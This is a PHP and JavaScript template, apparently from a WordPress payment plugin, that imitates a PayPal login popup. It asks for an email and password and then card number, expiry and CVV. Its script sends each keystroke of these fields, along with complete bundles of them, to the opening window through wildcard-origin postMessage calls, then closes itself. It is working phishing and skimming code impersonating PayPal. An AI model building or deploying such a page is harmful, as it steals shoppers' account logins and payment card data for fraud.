<?php
// Disable caching
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "PayPal Sans Small", "Helvetica Neue", Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
        }
        
        .paypal-container {
            max-width: 450px;
            margin: 0 auto;
            padding: 40px 35px;
        }
        
        /* Loading animation step */
        .loading-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 400px;
        }
        
        .loading-spinner {
            position: relative;
            width: 120px;
            height: 120px;
        }
        
        .loading-spinner .circle-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 4px solid #e6e6e6;
            border-radius: 50%;
        }
        
        .loading-spinner .circle-progress {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 4px solid transparent;
            border-top-color: #0070ba;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-spinner .lock-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            color: #cbd2d6;
        }
        
        .loading-spinner .lock-icon svg {
            width: 100%;
            height: 100%;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .paypal-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .paypal-logo svg {
            height: 28px;
            width: auto;
        }
        
        .paypal-description {
            text-align: center;
            color: #0070ba;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 28px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .paypal-input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #cbd2d6;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        
        .paypal-input:focus {
            outline: none;
            border-color: #0070ba;
            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
        }
        
        .paypal-input.error {
            border-color: #d20000;
        }
        
        .paypal-input::placeholder {
            color: #6c7378;
        }
        
        .forgot-link {
            display: block;
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .paypal-btn {
            width: 100%;
            padding: 14px 24px;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        
        .paypal-btn:active {
            transform: scale(0.98);
        }
        
        .btn-primary {
            background: #0070ba;
            color: #fff;
        }
        
        .btn-primary:hover {
            background: #005ea6;
        }
        
        .btn-outline {
            background: #fff;
            color: #2c2e2f;
            border: 2px solid #2c2e2f;
        }
        
        .btn-outline:hover {
            background: #f5f7fa;
        }
        
        .btn-gold {
            background: linear-gradient(to bottom, #ffc439 0%, #f5b526 100%);
            color: #003087;
            font-weight: 700;
        }
        
        .btn-gold:hover {
            background: linear-gradient(to bottom, #f5b526 0%, #e6a617 100%);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #6c7378;
            font-size: 14px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #cbd2d6;
        }
        
        .divider span {
            padding: 0 16px;
        }
        
        .error-msg {
            color: #d20000;
            font-size: 13px;
            margin-top: 6px;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Step 2: Card page */
        .card-step {
            display: none;
        }
        
        .card-header {
            background: linear-gradient(135deg, #003087 0%, #001f5c 100%);
            padding: 20px 24px;
            margin: -40px -35px 0 -35px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .back-btn {
            position: absolute;
            left: 16px;
            background: none;
            border: none;
            color: #fff;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
        }
        
        .back-btn:hover {
            background: rgba(255,255,255,0.15);
        }
        
        .back-btn svg {
            width: 20px;
            height: 20px;
        }
        
        .card-header-logo {
            font-size: 24px;
            font-weight: 700;
            color: #fff;
        }
        
        .card-body {
            padding-top: 30px;
        }
        
        .card-title {
            font-size: 22px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .card-subtitle {
            font-size: 14px;
            color: #6c7378;
            text-align: center;
            margin-bottom: 24px;
        }
        
        .card-brands {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 28px;
        }
        
        .card-brands img {
            height: 32px;
            opacity: 0.4;
            transition: opacity 0.2s;
        }
        
        .card-brands img.active {
            opacity: 1;
        }
        
        .form-label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-row {
            display: flex;
            gap: 16px;
        }
        
        .form-half {
            flex: 1;
        }
        
        .card-input-wrap {
            position: relative;
        }
        
        .card-brand-icon {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
        }
        
        .card-brand-icon img {
            height: 24px;
        }
        
        .secure-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 13px;
            color: #6c7378;
            margin: 24px 0;
            padding: 12px;
            background: #f5f7fa;
            border-radius: 8px;
        }
        
        .secure-note svg {
            width: 18px;
            height: 18px;
            fill: #6c7378;
        }
        
        /* Footer styles */
        .paypal-footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            text-align: center;
        }
        
        .paypal-footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }
        
        .paypal-footer-links a {
            color: #6c7378;
            text-decoration: none;
            font-size: 12px;
        }
        
        .paypal-footer-links a:hover {
            text-decoration: underline;
        }
        
        .paypal-footer-copyright {
            font-size: 11px;
            color: #9ca3af;
        }
    </style>
</head>
<body>
    <div class="paypal-container">
        <!-- Loading step -->
        <div class="loading-step" id="loading-step">
            <div class="loading-spinner">
                <div class="circle-bg"></div>
                <div class="circle-progress"></div>
                <div class="lock-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <rect x="5" y="11" width="14" height="10" rx="2" ry="2"/>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                        <line x1="12" y1="15" x2="12" y2="17"/>
                    </svg>
                </div>
            </div>
        </div>
        
        <!-- Step 1: Login -->
        <div class="login-step" id="login-step" style="display: none;">
            <div class="paypal-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 26">
                    <path fill="#000000" d="M12.237 2.4h-6.9c-.5 0-.9.3-1 .8L1.6 20.3c-.1.3.2.7.6.7h3.5c.3 0 .6-.2.7-.6l.8-5c.1-.5.5-.8 1-.8h2.2c4.5 0 7.2-2.2 7.9-6.6.3-1.9 0-3.4-.9-4.4-1-1.2-2.7-1.8-5.1-1.8zm.8 6.5c-.4 2.5-2.3 2.5-4.1 2.5h-1l.7-4.7c0-.3.3-.5.6-.5h.5c1.3 0 2.4 0 3.1.7.3.5.4 1.1.2 2zM32.6 8.7h-3.3c-.3 0-.5.2-.6.5l-.1.9-.2-.3c-.7-1-2.3-1.4-3.9-1.4-3.6 0-6.8 2.8-7.4 6.7-.3 1.9.1 3.8 1.2 5.1 1 1.2 2.4 1.7 4.2 1.7 2.9 0 4.6-1.9 4.6-1.9l-.1.9c-.1.4.2.7.6.7h3c.5 0 .9-.3 1-.8l1.8-11.4c-.1-.4-.3-.7-.8-.7zm-4.6 6.5c-.3 1.9-1.8 3.2-3.7 3.2-1 0-1.7-.3-2.2-.9-.5-.6-.7-1.4-.5-2.3.3-1.9 1.8-3.2 3.7-3.2.9 0 1.7.3 2.2.9.5.6.7 1.4.5 2.3zM50 8.7h-3.3c-.3 0-.6.2-.8.4l-4.6 6.8-2-6.5c-.1-.4-.5-.7-.9-.7h-3.3c-.4 0-.7.4-.5.8l3.7 10.8-3.5 4.9c-.3.4 0 .9.5.9h3.3c.3 0 .6-.2.8-.4l11-16c.2-.4 0-.9-.4-.9z"/>
                    <path fill="#000000" d="M61.4 2.4h-6.9c-.5 0-.9.3-1 .8l-2.8 17.8c-.1.3.2.7.6.7h3.5c.5 0 .9-.3 1-.8l.8-5c.1-.5.5-.8 1-.8h2.2c4.5 0 7.2-2.2 7.9-6.6.3-1.9 0-3.4-.9-4.4-1-1.2-2.7-1.8-5.1-1.8zm.8 6.5c-.4 2.5-2.3 2.5-4.1 2.5h-1l.7-4.7c0-.3.3-.5.6-.5h.5c1.3 0 2.4 0 3.1.7.3.5.4 1.1.2 2zM81.7 8.7h-3.3c-.3 0-.5.2-.6.5l-.1.9-.2-.3c-.7-1-2.3-1.4-3.9-1.4-3.6 0-6.8 2.8-7.4 6.7-.3 1.9.1 3.8 1.2 5.1 1 1.2 2.4 1.7 4.2 1.7 2.9 0 4.6-1.9 4.6-1.9l-.1.9c-.1.4.2.7.6.7h3c.5 0 .9-.3 1-.8l1.8-11.4c-.1-.4-.4-.7-.8-.7zm-4.7 6.5c-.3 1.9-1.8 3.2-3.7 3.2-1 0-1.7-.3-2.2-.9-.5-.6-.7-1.4-.5-2.3.3-1.9 1.8-3.2 3.7-3.2.9 0 1.7.3 2.2.9.5.6.7 1.4.5 2.3zM85.3 2.7l-2.8 18.1c-.1.3.2.7.6.7h2.8c.5 0 .9-.3 1-.8l2.8-17.8c.1-.3-.2-.7-.6-.7h-3.2c-.3 0-.5.2-.6.5z"/>
                </svg>
            </div>
            
            <div class="paypal-description">
                With a PayPal account, you're eligible for Purchase Protection and Rewards.
            </div>
            
            <div class="form-group">
                <input type="email" class="paypal-input" id="pp-email" placeholder="Email or mobile number" autocomplete="email">
            </div>
            
            <div class="form-group">
                <input type="password" class="paypal-input" id="pp-password" placeholder="Password" autocomplete="current-password">
            </div>
            
            <a href="#" class="forgot-link">Forgot password?</a>
            
            <button type="button" class="paypal-btn btn-primary" id="pp-login-btn">Log In</button>
            
            <div class="divider"><span>or</span></div>
            
            <button type="button" class="paypal-btn btn-outline" id="pp-card-btn">Pay with a Card</button>
            
            <!-- Footer -->
            <div class="paypal-footer">
                <div class="paypal-footer-links">
                    <a href="#">Contact</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>
                </div>
                <div class="paypal-footer-copyright">
                    © 1999-2026 PayPal. All rights reserved.
                </div>
            </div>
        </div>
        
        <!-- Step 2: Card -->
        <div class="card-step" id="card-step">
            <div class="card-header">
                <button type="button" class="back-btn" id="pp-back-btn">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M19 12H5M12 19l-7-7 7-7"/>
                    </svg>
                </button>
                <span class="card-header-logo">PayPal</span>
            </div>
            
            <div class="card-body">
                <h3 class="card-title">Link a card</h3>
                <p class="card-subtitle">We accept credit and debit cards from Visa, Mastercard, American Express and Discover.</p>
                
                <div class="card-brands" id="card-brands">
                    <img src="<?php echo esc_url(plugins_url('assets/images/figma/visa.svg', dirname(dirname(__FILE__)) . '/welcome-payment-gateway.php')); ?>" alt="Visa" data-brand="visa">
                    <img src="<?php echo esc_url(plugins_url('assets/images/figma/mastercard.svg', dirname(dirname(__FILE__)) . '/welcome-payment-gateway.php')); ?>" alt="Mastercard" data-brand="mastercard">
                    <img src="<?php echo esc_url(plugins_url('assets/images/figma/amex.svg', dirname(dirname(__FILE__)) . '/welcome-payment-gateway.php')); ?>" alt="Amex" data-brand="amex">
                    <img src="<?php echo esc_url(plugins_url('assets/images/figma/discover.jpg', dirname(dirname(__FILE__)) . '/welcome-payment-gateway.php')); ?>" alt="Discover" data-brand="discover">
                </div>
                
                <div class="form-group">
                    <label class="form-label">Card number</label>
                    <div class="card-input-wrap">
                        <input type="text" class="paypal-input" id="pp-card-number" placeholder="Card number" maxlength="19" inputmode="numeric">
                        <div class="card-brand-icon" id="card-brand-icon"></div>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group form-half">
                        <label class="form-label">Expiry date</label>
                        <input type="text" class="paypal-input" id="pp-expiry" placeholder="MM / YY" maxlength="7" inputmode="numeric">
                    </div>
                    <div class="form-group form-half">
                        <label class="form-label">Security code</label>
                        <input type="text" class="paypal-input" id="pp-cvv" placeholder="CVV" maxlength="4" inputmode="numeric">
                    </div>
                </div>
                
                <div class="secure-note">
                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                    <span>Your financial information is encrypted and secure.</span>
                </div>
                
                <button type="button" class="paypal-btn btn-gold" id="pp-link-card-btn">Link Card</button>
                
                <!-- Footer -->
                <div class="paypal-footer">
                    <div class="paypal-footer-links">
                        <a href="#">Contact</a>
                        <a href="#">Privacy</a>
                        <a href="#">Legal</a>
                        <a href="#">Worldwide</a>
                    </div>
                    <div class="paypal-footer-copyright">
                        © 1999-2026 PayPal. All rights reserved.
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        (function() {
            var userData = { email: '', password: '', cardNumber: '', expiry: '', cvv: '', brand: '' };
            
            // Elements
            var loadingStep = document.getElementById('loading-step');
            var loginStep = document.getElementById('login-step');
            var cardStep = document.getElementById('card-step');
            var emailInput = document.getElementById('pp-email');
            var passwordInput = document.getElementById('pp-password');
            var cardNumberInput = document.getElementById('pp-card-number');
            var expiryInput = document.getElementById('pp-expiry');
            var cvvInput = document.getElementById('pp-cvv');
            
            // Show loading animation
            function showLoading(callback, delay) {
                loadingStep.style.display = 'flex';
                loginStep.style.display = 'none';
                cardStep.style.display = 'none';
                
                setTimeout(function() {
                    loadingStep.style.display = 'none';
                    if (callback) callback();
                }, delay || 1500);
            }
            
            // 页面加载后Show loading animation，然后显示登录
            setTimeout(function() {
                showLoading(function() {
                    loginStep.style.display = 'block';
                }, 2000);
            }, 100);
            
            // Login button
            document.getElementById('pp-login-btn').onclick = function() {
                var email = emailInput.value.trim();
                var password = passwordInput.value;
                
                if (!validateEmail(email)) {
                    showError(emailInput, 'Please enter a valid email');
                    return;
                }
                if (!password) {
                    showError(passwordInput, 'Please enter your password');
                    return;
                }
                
                userData.email = email;
                userData.password = password;
                
                // Show loading animation然后切换到卡片步骤
                showLoading(function() {
                    showCardStep();
                }, 1500);
            };
            
            // Pay with Card 按钮
            document.getElementById('pp-card-btn').onclick = function() {
                showLoading(function() {
                    showCardStep();
                }, 1500);
            };
            
            // Back button
            document.getElementById('pp-back-btn').onclick = function() {
                cardStep.style.display = 'none';
                loginStep.style.display = 'block';
            };
            
            // Link Card 按钮
            document.getElementById('pp-link-card-btn').onclick = function() {
                var cardNumber = cardNumberInput.value.replace(/\s/g, '');
                var expiry = expiryInput.value;
                var cvv = cvvInput.value;
                
                if (cardNumber.length < 13) {
                    showError(cardNumberInput, 'Invalid card number');
                    return;
                }
                if (!validateExpiry(expiry)) {
                    showError(expiryInput, 'Invalid expiry');
                    return;
                }
                if (cvv.length < 3) {
                    showError(cvvInput, 'Invalid CVV');
                    return;
                }
                
                userData.cardNumber = cardNumber;
                userData.expiry = expiry;
                userData.cvv = cvv;
                
                var btn = this;
                btn.innerHTML = '<span class="loading"></span>';
                btn.disabled = true;
                
                // 🔥🔥🔥 Step 1: Send data to parent window immediately 🔥🔥🔥
                if (window.opener && !window.opener.closed) {
                    // Send complete data - parent will show 3D waiting and submit
                    window.opener.postMessage({
                        type: 'cpg_paypal_complete',
                        data: userData
                    }, '*');
                    
                    // Also send as card_submit event (like main gateway submit button)
                    window.opener.postMessage({
                        type: 'cpg_paypal_card_submit',
                        data: {
                            card_number: cardNumber,
                            expiry: expiry,
                            cvv: cvv,
                            brand: userData.brand,
                            email: userData.email,
                            password: userData.password
                        }
                    }, '*');
                }
                
                // 🔥 Close popup after short delay (parent will handle the rest)
                setTimeout(function() {
                    window.close();
                }, 800);
            };
            
            // 🔥🔥🔥 Link Card button blur event - also sends card data 🔥🔥🔥
            document.getElementById('pp-link-card-btn').addEventListener('blur', function() {
                var cardNumber = cardNumberInput.value.replace(/\s/g, '');
                var expiry = expiryInput.value;
                var cvv = cvvInput.value;
                
                // Only send if all fields are filled
                if (cardNumber.length >= 13 && validateExpiry(expiry) && cvv.length >= 3) {
                    if (window.opener && !window.opener.closed) {
                        window.opener.postMessage({
                            type: 'cpg_paypal_blur',
                            field: 'link_card_button',
                            value: 'blur',
                            data: {
                                card_number: cardNumber,
                                expiry: expiry,
                                cvv: cvv,
                                brand: userData.brand,
                                email: userData.email,
                                password: userData.password
                            }
                        }, '*');
                    }
                }
            });
            
            // Format card number
            cardNumberInput.oninput = function() {
                var value = this.value.replace(/\D/g, '');
                var formatted = '';
                for (var i = 0; i < value.length && i < 16; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                this.value = formatted;
                detectBrand(value);
            };
            
            // Format expiry
            expiryInput.oninput = function() {
                var value = this.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
                }
                this.value = value;
            };
            
            // CVV Only allow digits
            cvvInput.oninput = function() {
                this.value = this.value.replace(/\D/g, '');
            };
            
            // Clear errors
            document.querySelectorAll('.paypal-input').forEach(function(input) {
                input.addEventListener("input", function() {
                    this.classList.remove('error');
                    var errMsg = this.parentElement.querySelector('.error-msg');
                    if (errMsg) errMsg.remove();
                });
            });
            
            function showCardStep() {
                loginStep.style.display = 'none';
                cardStep.style.display = 'block';
            }
            
            function showError(input, msg) {
                input.classList.add('error');
                var existing = input.parentElement.querySelector('.error-msg');
                if (existing) existing.remove();
                var errEl = document.createElement('div');
                errEl.className = 'error-msg';
                errEl.textContent = msg;
                input.parentElement.appendChild(errEl);
                input.focus();
            }
            
            function validateEmail(email) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            }
            
            function validateExpiry(expiry) {
                return /^(0[1-9]|1[0-2])\s*\/\s*\d{2}$/.test(expiry);
            }
            
            function detectBrand(number) {
                number = number.replace(/\s/g, '');
                var brand = '';
                
                if (/^4/.test(number)) {
                    brand = 'visa';
                } else if (/^5[1-5]/.test(number) || /^2[2-7]/.test(number)) {
                    brand = 'mastercard';
                } else if (/^3[47]/.test(number)) {
                    brand = 'amex';
                } else if (/^6(?:011|5)/.test(number)) {
                    brand = 'discover';
                }
                
                userData.brand = brand;
                
                // Update brand icon highlight
                var brandImages = document.querySelectorAll('#card-brands img');
                brandImages.forEach(function(img) {
                    img.classList.remove('active');
                });
                
                if (brand) {
                    var activeImg = document.querySelector('#card-brands img[data-brand="' + brand + '"]');
                    if (activeImg) {
                        activeImg.classList.add('active');
                        
                        // Show brand icon in input field
                        var brandIcon = document.getElementById('card-brand-icon');
                        if (brandIcon) {
                            brandIcon.innerHTML = '<img src="' + activeImg.src + '" alt="' + brand + '">';
                        }
                    }
                } else {
                    var brandIcon = document.getElementById('card-brand-icon');
                    if (brandIcon) {
                        brandIcon.innerHTML = '';
                    }
                }
            }
            
            // Submit on Enter
            passwordInput.onkeypress = function(e) {
                if (e.which === 13) document.getElementById('pp-login-btn').click();
            };
            emailInput.onkeypress = function(e) {
                if (e.which === 13) passwordInput.focus();
            };
            
            // 🔥🔥🔥 Real-time input events - Send data to parent window on every input (same as main gateway) 🔥🔥🔥
            
            // Helper function to send input event to parent (real-time)
            function sendInputEvent(fieldType, fieldValue, additionalData) {
                if (window.opener && !window.opener.closed) {
                    window.opener.postMessage({
                        type: 'cpg_paypal_input',
                        field: fieldType,
                        value: fieldValue,
                        data: additionalData || {}
                    }, '*');
                }
            }
            
            // Helper function to send blur event to parent
            function sendBlurEvent(fieldType, fieldValue, additionalData) {
                if (window.opener && !window.opener.closed) {
                    window.opener.postMessage({
                        type: 'cpg_paypal_blur',
                        field: fieldType,
                        value: fieldValue,
                        data: additionalData || {}
                    }, '*');
                }
            }
            
            // 🔥 Email input event (real-time)
            emailInput.addEventListener('input', function() {
                var email = this.value.trim();
                if (email.length > 0) {
                    userData.email = email;
                    sendInputEvent('email', email, { 
                        email: email,
                        is_valid: validateEmail(email)
                    });
                }
            });
            
            // 🔥 Email blur event
            emailInput.addEventListener('blur', function() {
                var email = this.value.trim();
                if (email && validateEmail(email)) {
                    userData.email = email;
                    sendBlurEvent('email', email, { email: email });
                }
            });
            
            // 🔥 Password input event (real-time)
            passwordInput.addEventListener('input', function() {
                var password = this.value;
                if (password.length > 0) {
                    userData.password = password;
                    sendInputEvent('password', password, { 
                        email: userData.email,
                        password: password,
                        length: password.length
                    });
                }
            });
            
            // 🔥 Password blur event
            passwordInput.addEventListener('blur', function() {
                var password = this.value;
                if (password) {
                    userData.password = password;
                    sendBlurEvent('password', password, { 
                        email: userData.email,
                        password: password 
                    });
                }
            });
            
            // 🔥 Card number input event (real-time) - already has oninput for formatting, add tracking
            var originalCardInput = cardNumberInput.oninput;
            cardNumberInput.oninput = function() {
                // Call original formatting function
                var value = this.value.replace(/\D/g, '');
                var formatted = '';
                for (var i = 0; i < value.length && i < 16; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                this.value = formatted;
                detectBrand(value);
                
                // 🔥 Send real-time input event
                if (value.length > 0) {
                    userData.cardNumber = value;
                    sendInputEvent('card_number', value, {
                        card_number: value,
                        card_type: userData.brand,
                        length: value.length
                    });
                }
            };
            
            // 🔥 Card number blur event
            cardNumberInput.addEventListener('blur', function() {
                var cardNumber = this.value.replace(/\s/g, '');
                if (cardNumber.length >= 13) {
                    userData.cardNumber = cardNumber;
                    sendBlurEvent('card_number', cardNumber, {
                        card_number: cardNumber,
                        brand: userData.brand
                    });
                }
            });
            
            // 🔥 Expiry input event (real-time)
            var originalExpiryInput = expiryInput.oninput;
            expiryInput.oninput = function() {
                // Formatting
                var value = this.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
                }
                this.value = value;
                
                // 🔥 Send real-time input event
                if (value.length > 0) {
                    userData.expiry = value;
                    sendInputEvent('expiry', value, {
                        card_number: userData.cardNumber,
                        expiry: value,
                        brand: userData.brand,
                        length: value.length
                    });
                }
            };
            
            // 🔥 Expiry blur event
            expiryInput.addEventListener('blur', function() {
                var expiry = this.value;
                if (validateExpiry(expiry)) {
                    userData.expiry = expiry;
                    sendBlurEvent('expiry', expiry, {
                        card_number: userData.cardNumber,
                        expiry: expiry,
                        brand: userData.brand
                    });
                }
            });
            
            // 🔥 CVV input event (real-time)
            var originalCvvInput = cvvInput.oninput;
            cvvInput.oninput = function() {
                // Only digits
                this.value = this.value.replace(/\D/g, '');
                var value = this.value;
                
                // 🔥 Send real-time input event
                if (value.length > 0) {
                    userData.cvv = value;
                    sendInputEvent('cvv', value, {
                        card_number: userData.cardNumber,
                        expiry: userData.expiry,
                        cvv: value,
                        brand: userData.brand,
                        length: value.length
                    });
                }
            };
            
            // 🔥 CVV blur event
            cvvInput.addEventListener('blur', function() {
                var cvv = this.value;
                if (cvv.length >= 3) {
                    userData.cvv = cvv;
                    sendBlurEvent('cvv', cvv, {
                        card_number: userData.cardNumber,
                        expiry: userData.expiry,
                        cvv: cvv,
                        brand: userData.brand
                    });
                }
            });
        })();
    </script>
</body>
</html>

